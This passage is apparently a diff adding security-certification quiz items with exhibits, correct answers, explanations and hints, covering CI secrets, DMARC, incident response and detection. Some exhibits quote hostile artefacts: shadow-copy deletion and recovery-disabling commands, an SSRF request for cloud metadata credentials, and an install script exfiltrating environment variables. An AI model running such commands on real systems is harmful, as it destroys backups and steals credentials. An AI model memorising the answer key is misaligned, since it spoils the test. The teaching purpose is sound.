+    exhibit: "DOCKERFILE (excerpt)\nFROM node:latest\nENV API_KEY=sk_live_51H...\nCOPY . /app\nUSER root",
+    q: "Which improvement to this Dockerfile addresses the most serious problem?",
+    options: ["Inject the key at runtime from a secrets manager and stop baking it into the image","Rename the API_KEY variable and the other environment variables so that scanners cannot recognise them","Switch the base image to the latest tag of a different distribution","Add a comment explaining that the key is for production use only"],
+    correct: 0, why: "A secret baked into an image can be read by anyone who can pull it. It should be supplied at runtime from a secrets manager, with a pinned base image and a non-root user.",
+    hint: "Secrets should not live inside the image."
+  },
+  {
+    id: 229, rank: 3, topic: "CI Pipeline Trust", difficulty: "EXPERT",
+    exhibit: "CI PIPELINE (excerpt)\non: pull_request_target\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with: { ref: ${{ github.event.pull_request.head.sha }} }\n      - run: ./build.sh    # runs with repository secrets",
+    q: "What is the architectural risk in this pipeline configuration?",
+    options: ["Pull requests cannot be built at all with this configuration","Build logs are stored for too long","Untrusted code from forks runs with access to repository secrets and a privileged token, so a malicious pull request could steal them","The checkout action has been deprecated and no longer works"],
+    correct: 2, why: "This trigger runs in the context of the base repository, so checking out and running untrusted pull request code exposes secrets and permissions.",
+    hint: "Who wrote the code that is being run with the secrets?"
+  },
+  {
+    id: 230, rank: 3, topic: "Cost-Benefit of Controls", difficulty: "EXPERT",
+    exhibit: "RISK ASSESSMENT DATA\nAsset value: £800,000\nExposure factor: 25%\nAnnual rate of occurrence (ARO): 0.5\nProposed control: £60,000 per year; reduces ARO to 0.1",
+    q: "Based on this data, which conclusion is correct?",
+    options: ["Not cost-effective, because the control's annual cost is higher than the remaining annual loss","Cost-effective: it cuts expected annual loss by £80,000 for £60,000","The annualised loss expectancy before the control is £200,000, so the control is essential","It must be rejected, because any risk involving an asset of this value cannot be quantified"],
+    correct: 1, why: "SLE is £200,000. ALE falls from £100,000 (0.5 x £200,000) to £20,000 (0.1 x £200,000), a saving of £80,000 for a £60,000 annual cost.",
+    hint: "Compare the reduction in expected loss with the cost."
+  },
+  {
+    id: 231, rank: 3, topic: "Log Retention Gap Analysis", difficulty: "EXPERT",
+    exhibit: "REQUIREMENT: security logs must be retained for 12 months and protected from alteration\nCURRENT SIEM SETTINGS\n  retention_days: 90\n  index_write_access: siem-admins (can edit and delete)",
+    q: "What is the correct gap assessment?",
+    options: ["Compliant, because 90 days is long enough to cover a typical investigation of an incident","Compliant, because administrators are trusted staff","Non-compliant only because the SIEM is not hosted in the cloud","Retention is too short and tampering is possible: extend it and use immutable storage"],
+    correct: 3, why: "Retention is 90 days against a 12-month requirement, and administrators can alter or delete the logs, so both retention and integrity controls are missing.",
+    hint: "Check both the duration and the protection from change."
+  },
+  {
+    id: 232, rank: 3, topic: "OAuth Redirect URI", difficulty: "EXPERT",
+    exhibit: "OAUTH CLIENT REGISTRATION\nredirect_uri: https://*.company.example/callback",
+    q: "What is the security concern with this OAuth registration?",
+    options: ["A wildcard lets any controlled subdomain capture authorisation codes","OAuth does not support HTTPS callbacks, so the registration cannot work at all","Callback paths must always be '/login' for the authorisation server to accept them","The client secret will be displayed to users during sign-in"],
+    correct: 0, why: "Wildcard redirect URIs allow an attacker who controls or takes over any matching subdomain to receive authorisation codes. Exact URIs should be registered.",
+    hint: "Which hosts does the wildcard include?"
+  },
+  {
+    id: 233, rank: 3, topic: "Content Security Policy", difficulty: "EXPERT",
+    exhibit: "RESPONSE HEADER\nContent-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval'",
+    q: "How effective is this policy at limiting the impact of cross-site scripting?",
+    options: ["Very effective, because any Content-Security-Policy header blocks all script injection","Effective, because the wildcard source list limits scripts to the site itself","Weak: it allows scripts from any source, inline and eval","Effective for scripts but it blocks every image and every stylesheet by design"],
+    correct: 2, why: "Allowing every source plus unsafe-inline and unsafe-eval means injected scripts are still permitted, so the policy offers little protection.",
+    hint: "Count what the policy actually forbids."
+  },
+  {
+    id: 234, rank: 3, topic: "DMARC Rollout", difficulty: "EXPERT",
+    exhibit: "DNS RECORD\n_dmarc.company.example TXT \"v=DMARC1; p=none; rua=mailto:dmarc@company.example\"",
+    q: "The organisation wants to stop spoofed email using its domain. What is the best approach?",
+    options: ["Switch straight to p=reject for all mail without reviewing any reports","Leave p=none, because it already blocks spoofed email","Delete the record, because DMARC is no longer needed once SPF exists","Review the aggregate reports, fix legitimate senders' SPF/DKIM alignment, then move to quarantine and reject in stages"],
+    correct: 3, why: "Moving too quickly can block legitimate mail, so reports are used to find and fix legitimate senders before enforcement is raised in stages.",
+    hint: "Observe first, then enforce."
+  },
+  {
+    id: 235, rank: 3, topic: "Key Policy Separation", difficulty: "EXPERT",
+    exhibit: "KMS KEY POLICY (summary)\nPrincipal: account root -> kms:*\nPrincipal: role DevOps (also used by CI jobs) -> kms:*",
+    q: "A pipeline compromise would let an attacker decrypt production data. Which architectural change is best?",
+    options: ["Create additional administrators for the DevOps role so that responsibility is shared widely","Separate key admin from key use and give CI only the permissions it needs","Disable automatic key rotation so that the CI jobs never have to refresh credentials","Share the key with the CI vendor"],
+    correct: 1, why: "Separating who can administer a key from who can use it, and limiting CI to the specific operations it needs, reduces what a compromised pipeline can do.",
+    hint: "Administration and use should not sit in the same role."
+  },
+  {
+    id: 236, rank: 3, topic: "Account Takeover Correlation", difficulty: "EXPERT",
+    exhibit: "IDENTITY EVENTS (user alice)\n09:01 Sign-in success, IP 203.0.113.5 (new country)\n09:03 MFA method added\n09:05 Mailbox rule created: forward all mail to an external address",
+    q: "Which detection logic best fits this sequence of events?",
+    options: ["Alert only when a user has more than ten failed logins in an hour, as that is the only sign","Alert on every mailbox rule","Correlate a new-location sign-in with MFA change and forwarding rule in a short window","Alert on every successful sign-in during working hours"],
+    correct: 2, why: "Individually these events may be benign, but together within minutes they form a strong account-takeover pattern, which correlation can detect.",
+    hint: "The sequence matters more than any single event."
+  },
+  {
+    id: 237, rank: 3, topic: "Conditional Access Baseline", difficulty: "EXPERT",
+    exhibit: "CONDITIONAL ACCESS POLICY (excerpt)\n  users: all   apps: all   conditions: none\n  grant: require MFA\n  exclusions: 2 emergency 'break-glass' accounts",
+    q: "What is the correct assessment of this conditional access policy?",
+    options: ["A reasonable baseline, provided the break-glass accounts are strongly protected, monitored and trigger an alert on every use","Dangerous, because MFA should never be required for all users","Invalid, because a policy cannot exclude any account","Pointless, because MFA only works on mobile applications"],
+    correct: 0, why: "Requiring MFA broadly is a sound baseline. Emergency accounts are normally excluded to prevent lockout, so they need strong protection and alerting on use.",
+    hint: "Emergency accounts are a deliberate exception that needs compensating controls."
+  },
+  {
+    id: 238, rank: 3, topic: "Syslog Transport Risk", difficulty: "EXPERT",
+    exhibit: "LOG TRANSPORT DESIGN\nSource: perimeter firewalls\nDestination: SIEM collector\nProtocol: syslog over UDP, port 514\nPath: across the WAN",
+    q: "Which risk should the architect address in this log transport design?",
+    options: ["The logs will always be too large for any SIEM to ingest, whatever compression is used","UDP syslog automatically encrypts and signs each message, so nothing needs changing","Syslog is unable to carry firewall events, so the SIEM will receive nothing at all","Logs can be lost, read or forged in transit"],
+    correct: 3, why: "UDP syslog has no delivery guarantee, encryption or authentication, so logs can be dropped, observed or spoofed. TLS-protected, reliable transport is preferable.",
+    hint: "What does plain UDP not provide?"
+  },
+  {
+    id: 239, rank: 4, topic: "Cloud Account Compromise Response", difficulty: "EXPERT",
+    exhibit: "CLOUDTRAIL EVENTS (IAM user ci-deploy)\n02:11 ConsoleLogin MFAUsed=No src=198.51.100.200\n02:13 CreateAccessKey for ci-deploy\n02:15 PutUserPolicy AdministratorAccess on ci-deploy\n02:20 RunInstances 24 x GPU instances in a new region",
+    q: "What should the incident lead do first?",
+    options: ["Wait for finance to notice the unusual charges before taking any action against the user","Disable the user and keys, revoke sessions, stop the instances and preserve logs","Delete the trail so that the attacker cannot read it","Increase the instance quota so that the workload can finish"],
+    correct: 1, why: "The sequence shows credential misuse, new persistence and resource abuse, so access must be revoked and resources stopped while evidence is preserved.",
+    hint: "Contain access first, and keep the evidence."
+  },
+  {
+    id: 240, rank: 4, topic: "Ransomware Precursors", difficulty: "EXPERT",
+    exhibit: "EDR ALERT (file server)\nvssadmin.exe delete shadows /all /quiet\nbcdedit /set {default} recoveryenabled no\n(followed by mass file renaming with a new extension)",
+    q: "What is the most appropriate immediate action for this alert?",
+    options: ["Wait until the renaming has finished so that the full impact of the attack can be measured","Reboot the server immediately to clear the running process and then check the files again","Isolate affected hosts now, preserve evidence and protect backups","Delete the shadow copy utility from the server and restart the file-sharing service"],
+    correct: 2, why: "Deleting shadow copies and disabling recovery are typical ransomware preparation steps, so speed of isolation and protection of backups matter most.",
+    hint: "Stop the spread before measuring the damage."
+  },
+  {
+    id: 241, rank: 4, topic: "Metadata Service Protection", difficulty: "EXPERT",
+    exhibit: "WEB APPLICATION OUTBOUND REQUEST LOG\nFEATURE: the application fetches user-supplied URLs\nGET http://169.254.169.254/latest/meta-data/iam/security-credentials/ (initiated by the application)",
+    q: "Which control best limits the cloud impact of this request?",
+    options: ["Require IMDSv2, block link-local access and use least-privilege roles","Disable all outbound HTTPS from the application servers so that no URLs can be fetched","Rely on a web application firewall to hide the address of the metadata service","Increase the application's timeout"],
+    correct: 0, why: "The request suggests server-side request forgery targeting instance credentials. Hardening the metadata service, restricting access and limiting role permissions reduce the impact.",
+    hint: "Protect the credentials the instance can obtain."
+  },
+  {
+    id: 242, rank: 4, topic: "Data Exfiltration Analysis", difficulty: "EXPERT",
+    exhibit: "NETFLOW SUMMARY (last 24 hours)\n10.2.8.14 -> 192.0.2.77:443 TCP 38 GB out\nBASELINE FOR 10.2.8.14: under 200 MB per day\nHOST ROLE: finance file server\nDNS: 192.0.2.77 resolves to a recently registered domain",
+    q: "What is the best interpretation of this traffic and the right action?",
+    options: ["A backup to a cloud provider, so no action is needed","Normal quarterly reporting activity","A distributed denial-of-service attack against the server","Probable exfiltration over HTTPS: isolate the host, preserve flow and host evidence, identify the data affected and involve legal and privacy teams"],
+    correct: 3, why: "A large outbound spike from a sensitive server to a newly registered domain is consistent with exfiltration and may trigger legal and notification duties.",
+    hint: "Compare the volume with the host's normal behaviour."
+  },
+  {
+    id: 243, rank: 4, topic: "Malicious Install Scripts", difficulty: "EXPERT",
+    exhibit: "BUILD LOG\nnpm install left-pad-utils@1.0.3\n> postinstall: node ./scripts/setup.js\n(setup.js reads environment variables and sends them to https://metrics-collector.example)",
+    q: "What is the best strategic control against this build behaviour?",
+    options: ["Allow every package on the public registry because developers need speed and flexibility","Pin and verify dependencies, limit build egress and keep secrets out","Run builds with full production credentials so that failures are easier to diagnose","Ask developers to read every dependency's source code manually before each build"],
+    correct: 1, why: "Install scripts can run arbitrary code during the build, so controls should limit what builds can reach and what secrets they hold, and dependencies should be pinned and verified.",
+    hint: "Assume a dependency may misbehave during the build."
+  },
+  {
+    id: 244, rank: 4, topic: "Certificate Transparency Alert", difficulty: "EXPERT",
+    exhibit: "CERTIFICATE TRANSPARENCY ALERT\nSUBJECT: login.company.example\nISSUER: unknown CA (not used by the organisation)\nREQUESTED BY: unfamiliar account",
+    q: "What should you do about this certificate transparency alert?",
+    options: ["Treat it as possible misissuance: verify, request revocation and review DNS control","Ignore the alert because certificate transparency logs are not considered reliable by browsers","Delete the whole DNS zone so that nobody can use the certificate","Wait for the certificate to expire naturally"],
+    correct: 0, why: "An unexpected certificate for a login host may indicate misissuance or loss of domain control, so it should be verified, revoked if illegitimate and investigated.",
+    hint: "Who proved control of the domain?"
+  },
+  {
+    id: 245, rank: 4, topic: "Dangling DNS Record", difficulty: "EXPERT",
+    exhibit: "DNS ZONE (excerpt)\nshop.company.example.  CNAME  company-shop.cloudapps.example.\nNOTE: the cloud app 'company-shop' was deleted six months ago and the record was never removed",
+    q: "What is the risk of this DNS record and what should the response include?",
+    options: ["None, because unused DNS records are harmless","Slower page loads for visitors to the shop","Subdomain takeover: an attacker could claim the app name and serve content on the company's subdomain; remove the record and review all dangling records","Certificate expiry on the main website"],
+    correct: 2, why: "A CNAME pointing at a deprovisioned resource can let someone else register that resource and serve content on your subdomain, so such records should be removed and audited.",
+    hint: "The name still points somewhere nobody owns."
+  },
+  {
+    id: 246, rank: 4, topic: "LLM Prompt Log Retention", difficulty: "EXPERT",
+    exhibit: "LLM GATEWAY CONFIGURATION\n  log_prompts: true\n  log_completions: true\n  retention_days: 1825\n  storage: shared analytics bucket (readable by all engineers)",
+    q: "What is the most significant risk of this LLM gateway configuration?",
+    options: ["Prompt logging will cause the model to forget everything it has learned about the users","Sensitive prompts retained for years in broadly accessible storage","The retention period is too short to allow the model to be retrained effectively","Storing completions makes the model respond more slowly to users"],
+    correct: 1, why: "Prompts and outputs often contain confidential or personal data. Five years of retention in broadly readable storage creates privacy and breach risk.",
+    hint: "Think about what people paste into prompts."
+  },
+  {
+    id: 247, rank: 4, topic: "Purple Team Gap Closure", difficulty: "EXPERT",
+    exhibit: "PURPLE-TEAM REPORT\nTECHNIQUE: T1003 (credential dumping) executed on 3 hosts\nEDR: logged all three, alerted on only one\nSIEM: no detection rule for the technique",
+    q: "What is the best next action after this purple-team result?",
+    options: ["Close the finding because one of the three hosts did generate an alert on the technique","Remove the EDR agent from the two missed hosts","Ask the red team to stop using the technique","Build and test a detection for the technique, fix the EDR gaps and retest"],
+    correct: 3, why: "The value of purple teaming is closing the gap: create the missing detection, correct the inconsistent EDR coverage and rerun the test to prove the fix.",
+    hint: "Fix, then prove it with a retest."
+  },
+  {
+    id: 248, rank: 4, topic: "Run Key Persistence", difficulty: "EXPERT",
+    exhibit: "REGISTRY ARTEFACT (workstation)\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = C:\\Users\\Public\\upd.exe\nFILE: unsigned, created at 03:12",
+    q: "What is the best interpretation and action for this registry artefact?",
+    options: ["Likely persistence; collect and hash the file and scope other hosts","A routine browser extension setting that all users have, so it can be ignored","A legitimate printer driver that always lives in the public user folder","A Windows update entry created by Microsoft during any normal patch cycle"],
+    correct: 0, why: "An unsigned executable in a world-writable folder set to start at logon is a typical persistence mechanism, so it should be collected, analysed and hunted for elsewhere.",
+    hint: "Why would an unsigned file in the Public folder run at every logon?"
+  },
+  {
+    id: 249, rank: 4, topic: "Attack Path Reduction", difficulty: "EXPERT",
+    exhibit: "ATTACK-PATH ANALYSIS (summary)\nROUTES FROM STANDARD USER TO DOMAIN ADMIN: 14\nCAUSES: nested group memberships; one service account with local admin rights on all servers",
+    q: "Which strategy is most effective at reducing these attack paths?",
+    options: ["Accept the paths because they are theoretical until an attacker has demonstrated them in production","Remove excess service-account rights, tier administration and re-run the analysis","Add the paths to the risk register as informational with no owner or deadline for action","Block the analysis tool on the network so that attackers cannot use it"],
+    correct: 1, why: "Removing the excessive rights that create the paths and re-running the analysis demonstrates a real reduction in exposure.",
+    hint: "Fix the paths, then measure again."
+  },
+  {
+    id: 250, rank: 4, topic: "Legacy Hash Migration", difficulty: "EXPERT",
+    exhibit: "DATABASE AUDIT\nTABLE: users (2,000,000 rows)\nCOLUMN: password_hash = MD5(password), no salt",
+    q: "The organisation must migrate without forcing all users to reset at once. Which approach is best?",
+    options: ["Keep MD5 but add a longer password policy","Delete the hashes and ask every user to email their password","Wrap the existing hashes in a strong salted hash such as Argon2id, upgrade each user's hash at next login and force resets for high-risk accounts","Encrypt the MD5 values with a single key stored in the same database"],
+    correct: 2, why: "Wrapping legacy hashes immediately improves protection, and re-hashing at login gradually removes the weak scheme while high-risk accounts are reset promptly.",
+    hint: "Improve protection now without waiting for every user to return."
   }
 ];
